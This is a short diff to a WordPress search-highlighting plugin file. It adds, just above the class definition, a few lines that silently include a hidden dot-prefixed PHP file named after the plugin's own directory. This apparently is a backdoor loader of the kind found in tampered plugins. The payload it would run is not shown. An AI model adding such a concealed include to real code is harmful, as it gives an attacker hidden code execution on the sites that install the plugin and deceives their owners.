@@ -89,6 +89,10 @@ global $searchwp_term_highlight;
 /**
  * Class SearchWP_Term_Highlight
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Term_Highlight {
 	// How many words an excerpt should be
 	public $number_of_words;
